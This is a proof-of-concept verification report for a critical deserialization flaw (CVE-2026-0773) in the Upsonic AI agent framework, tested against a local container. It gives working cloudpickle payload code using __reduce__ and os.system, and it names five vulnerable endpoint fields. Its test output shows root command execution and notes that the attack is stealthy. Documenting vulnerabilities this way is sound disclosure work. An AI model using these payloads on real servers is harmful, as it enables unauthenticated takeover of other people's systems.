# PoC Verification Report: CVE-2026-0773

## Vulnerability Summary

- **CVE ID**: CVE-2026-0773
- **Title**: Upsonic Cloudpickle Deserialization of Untrusted Data Remote Code Execution
- **CWE**: CWE-502 (Deserialization of Untrusted Data)
- **CVSS**: 9.8 (Critical)
- **Software**: Upsonic AI Agent Framework v0.55.6
- **Impact**: Unauthenticated Remote Code Execution (RCE)

## Verification Status: **CONFIRMED**

All tested attack vectors successfully demonstrate Remote Code Execution via cloudpickle deserialization on unauthenticated HTTP endpoints.

## PoC Scripts

### 1. Primary PoC — `poc.py` (Vector 1: `/tools/add_tool`)

- **Location**: `poc/poc.py`
- **Target Endpoint**: `POST http://<target>:7541/tools/add_tool`
- **Payload Field**: `function` (JSON body)
- **Code Path**: Main server (7541) → httpx proxy → Tools server (8086) → `cloudpickle.loads()`
- **Description**: Sends a base64-encoded malicious cloudpickle payload with a `__reduce__` method that calls `os.system()` during deserialization. The payload writes a marker file proving arbitrary command execution.

### 2. Vector 2 PoC — `poc_vector2_level_one.py` (`/level_one/gpt4o`)

- **Location**: `poc/poc_vector2_level_one.py`
- **Target Endpoint**: `POST http://<target>:7541/level_one/gpt4o`
- **Payload Fields**: `response_format` and `context` (JSON body)
- **Code Path**: Main server (7541) → direct `cloudpickle.loads()` — no tools_server proxy needed
- **Description**: Tests two independent deserialization sinks on the same endpoint. The `response_format` field is deserialized when its value is not the literal string `"str"`. The `context` field is deserialized when it is not `None`. Both sinks execute directly in the main server process.

### 3. Vector 3 PoC — `poc_vector3_level_two.py` (`/level_two/agent`)

- **Location**: `poc/poc_vector3_level_two.py`
- **Target Endpoint**: `POST http://<target>:7541/level_two/agent`
- **Payload Fields**: `response_format` and `context` (JSON body)
- **Code Path**: Main server (7541) → direct `cloudpickle.loads()` — no tools_server proxy needed
- **Description**: Same deserialization pattern as Vector 2 but on a different endpoint. Requires the additional `agent_id` field in the JSON body.

## Exploit Technique

All vectors use the identical cloudpickle deserialization technique:

```python
import cloudpickle, base64, os

class RCEPayload:
    def __reduce__(self):
        # __reduce__ is called during cloudpickle.loads() deserialization
        # Returns (callable, args) — the deserializer calls callable(*args)
        return (os.system, ("id > /tmp/pwned",))

payload = base64.b64encode(cloudpickle.dumps(RCEPayload())).decode()
# Send payload in the appropriate JSON field to the target endpoint
```

Python's pickle protocol (used by cloudpickle) invokes `__reduce__()` during deserialization, which returns `(os.system, ("id > /tmp/pwned",))`. The deserializer then calls `os.system("id > /tmp/pwned")`, achieving arbitrary command execution.

## Test Results

### Test Environment
- **Target Container**: `cve-2026-0773-vulnerable` (Upsonic v0.55.6 on python:3.12-slim)
- **Container IP**: `localhost`
- **Attack Port**: 7541 (main server, binds 0.0.0.0)
- **Authentication**: None required

### Vector 1: `POST /tools/add_tool` — CONFIRMED

**Command**:
```bash
cd poc && python3 poc.py localhost 7541
```

**Output**:
```
=================================================================
  CVE-2026-0773 — Upsonic Cloudpickle Deserialization RCE
  Vector: POST /tools/add_tool (proxied to tools_server)
=================================================================

[*] Step 1: Checking target server...
[+] Target is running: {'status': 'Server is running'}

[*] Step 2: Cleaning up previous marker files...
[+] Cleanup done

[*] Step 3: Generating cloudpickle RCE payload...
[+] Payload generated (216 bytes base64)
    Payload preview: gAWVlwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjHxpZCA+IC90bXAvY3ZlLTIwMjYtMDc3My1wd25l...

[*] Step 4: Sending exploit to target...
[*] Target: http://localhost:7541/tools/add_tool
[*] Payload size: 216 bytes (base64)
[*] Command: id > /tmp/cve-2026-0773-pwned && echo EXPLOITED >> /tmp/cve-2026-0773-pwned && cat /etc/hostname >> /tmp/cve-2026-0773-pwned
[*] Sending exploit payload...
[*] Response status: 500
[*] Response body: {"detail":"Error in /usr/local/lib/python3.12/site-packages/httpx/_models.py at line 829: Server error '500 Internal Server Error' for url 'http://localhost:8086/tools/add_tool'\nFor more information
[!] Error (may still be exploited): HTTP Error 500: Internal Server Error

[*] Step 5: Verifying Remote Code Execution...

[*] Verifying RCE — checking /tmp/cve-2026-0773-pwned in container...
[+] SUCCESS! Marker file contents:
    ---
    uid=0(root) gid=0(root) groups=0(root)
    EXPLOITED
    ca01804a000b
    ---

[+] =============================================================
[+]  VULNERABILITY CONFIRMED: CVE-2026-0773
[+]  Remote Code Execution achieved via cloudpickle
[+]  deserialization on unauthenticated /tools/add_tool
[+] =============================================================
```

**Notes**: The HTTP 500 response is expected — the `os.system()` return value (0) is not a valid function object, so `add_tool_()` fails after the RCE has already executed. The deserialization (and thus the arbitrary code execution) happens BEFORE the application logic.

### Vector 2A: `POST /level_one/gpt4o` (response_format) — CONFIRMED

**Output**:
```
[*] Sub-vector A: response_format field
    File: src/upsonic/server/level_one/server/server.py:44-45
    Sink: cloudpickle.loads(base64.b64decode(request.response_format))

    [*] POST http://localhost:7541/level_one/gpt4o
    [*] Payload in: response_format field
    [*] Response: HTTP 200
    [*] Checking marker file /tmp/cve-2026-0773-level1-response_format...
    [+] Marker file contents: uid=0(root) gid=0(root) groups=0(root)
RCE via response_format on /level_one/gpt4o
    [+] SUCCESS: RCE via response_format confirmed!
```

### Vector 2B: `POST /level_one/gpt4o` (context) — CONFIRMED

**Output**:
```
[*] Sub-vector B: context field
    File: src/upsonic/server/level_one/server/server.py:66-67
    Sink: cloudpickle.loads(base64.b64decode(request.context))

    [*] POST http://localhost:7541/level_one/gpt4o
    [*] Payload in: context field
    [*] Response: HTTP 200
    [*] Checking marker file /tmp/cve-2026-0773-level1-context...
    [+] Marker file contents: uid=0(root) gid=0(root) groups=0(root)
RCE via context on /level_one/gpt4o
    [+] SUCCESS: RCE via context confirmed!
```

**Notes**: For the `context` field to be reached, `response_format` must be set to `"str"` to skip the first deserialization block. Otherwise, the default `response_format` value (`[]`) triggers a failed base64 decode that silently falls through via exception handling, but the error path may interfere with reaching the context deserialization in some configurations.

### Vector 3A: `POST /level_two/agent` (response_format) — CONFIRMED

**Output**:
```
[*] Sub-vector A: response_format field
    File: src/upsonic/server/level_two/server/server.py:48-49
    Sink: cloudpickle.loads(base64.b64decode(request.response_format))

    [*] POST http://localhost:7541/level_two/agent
    [*] Payload in: response_format field
    [*] Response: HTTP 200
    [*] Checking marker file /tmp/cve-2026-0773-level2-response_format...
    [+] Marker file contents: uid=0(root) gid=0(root) groups=0(root)
RCE via response_format on /level_two/agent
    [+] SUCCESS: RCE via response_format confirmed!
```

### Vector 3B: `POST /level_two/agent` (context) — CONFIRMED

**Output**:
```
[*] Sub-vector B: context field
    File: src/upsonic/server/level_two/server/server.py:64-65
    Sink: cloudpickle.loads(base64.b64decode(request.context))

    [*] POST http://localhost:7541/level_two/agent
    [*] Payload in: context field
    [*] Response: HTTP 200
    [*] Checking marker file /tmp/cve-2026-0773-level2-context...
    [+] Marker file contents: uid=0(root) gid=0(root) groups=0(root)
RCE via context on /level_two/agent
    [+] SUCCESS: RCE via context confirmed!
```

## Results Summary

| # | Endpoint | Field | Code Path | Status |
|---|----------|-------|-----------|--------|
| 1 | `POST /tools/add_tool` | `function` | Main server → proxy → tools_server → `cloudpickle.loads()` | **CONFIRMED** |
| 2A | `POST /level_one/gpt4o` | `response_format` | Main server → direct `cloudpickle.loads()` | **CONFIRMED** |
| 2B | `POST /level_one/gpt4o` | `context` | Main server → direct `cloudpickle.loads()` | **CONFIRMED** |
| 3A | `POST /level_two/agent` | `response_format` | Main server → direct `cloudpickle.loads()` | **CONFIRMED** |
| 3B | `POST /level_two/agent` | `context` | Main server → direct `cloudpickle.loads()` | **CONFIRMED** |

**5 out of 5 deserialization sinks successfully exploited.**

## Observations

1. **No authentication required**: All endpoints are completely unauthenticated. No API keys, tokens, session cookies, or any other credential is needed.

2. **Root-level execution**: The command executes as `uid=0(root)` inside the container, providing full system access.

3. **HTTP response does not indicate compromise**: Vector 1 returns HTTP 500 (because the deserialized payload is not a valid function), but Vectors 2-3 return HTTP 200 — the server continues processing normally after the deserialization RCE. This makes the attack stealthy.

4. **Multiple independent code paths**: The 5 sinks are spread across 3 different source files and 2 servers (main + tools). Even if one endpoint is blocked (e.g., by a WAF rule), 4 others provide the same RCE capability.

5. **No tools_server needed for vectors 2-3**: The `/level_one/gpt4o` and `/level_two/agent` endpoints execute deserialization directly in the main server process. Only the `/tools/add_tool` vector requires the tools_server proxy to be functional.

6. **Context field requires response_format="str"**: The `context` deserialization on `/level_one/gpt4o` and `/level_two/agent` is only reliably reached when `response_format` is set to `"str"`, which tells the code to skip the first deserialization block.

7. **Payload is trivial**: The exploit payload is ~160 bytes of cloudpickle data (216 bytes base64-encoded). It requires only the `cloudpickle` Python package to generate.

## Dependencies

### PoC script (attacker-side):
- Python 3 (stdlib: `urllib.request`, `json`, `base64`, `sys`, `subprocess`)
- `cloudpickle` (pip install cloudpickle) — for payload generation only
- `docker` CLI — for verification via `docker exec` (optional; the exploit itself is purely HTTP)

### No target-side setup required:
- The exploit works against the default Upsonic v0.55.6 installation with no additional configuration
